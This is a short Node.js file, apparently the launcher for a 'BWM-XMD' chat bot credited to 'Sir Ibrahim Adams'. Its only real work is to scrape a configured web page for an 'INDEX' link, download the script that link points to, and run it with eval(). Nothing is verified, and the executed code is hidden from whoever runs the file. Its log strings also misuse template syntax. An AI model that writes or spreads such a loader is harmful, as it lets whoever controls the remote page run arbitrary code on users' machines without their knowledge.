//  [BWM-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Ibrahim Adams                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require("./config");

const botname="Ben whittaker tech"

async function fetchINDEXUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("INDEX")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('${Whittaker tech}heart not found 😭');
    }

    console.log('${Whittaker tech}The heart is loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('${Whittaker tech}Error:', error.message);
  }
}

fetchINDEXUrl()
  .catch(err => console.error('${Whittaker tech}Error:', err.message));
